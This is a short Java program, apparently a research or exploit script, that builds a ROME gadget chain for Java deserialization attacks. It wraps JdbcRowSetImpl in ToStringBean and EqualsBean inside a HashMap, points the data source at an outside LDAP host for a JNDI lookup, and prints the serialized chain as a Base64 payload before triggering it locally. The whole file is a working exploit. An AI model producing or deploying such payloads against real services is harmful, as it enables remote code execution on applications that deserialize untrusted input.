package rome;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import util.utils;

import java.util.Base64;
import java.util.HashMap;

public class rome3 {
    public static void main(String[] args) throws Exception{
        JdbcRowSetImpl j = new JdbcRowSetImpl();
        j.setDataSourceName("ldap://d92d14bde1.ipv6.xn--gg8h.eu.org.");
        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, "1");
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        HashMap hashmap = new HashMap();
        hashmap.put(equalsBean,1);
        utils.setFieldValue(toStringBean,"_obj",j);
        byte[] ser = utils.serialize(hashmap);
        String exp = Base64.getEncoder().encodeToString(ser);
        System.out.println(exp);
        utils.unserialize(ser);
    }
}
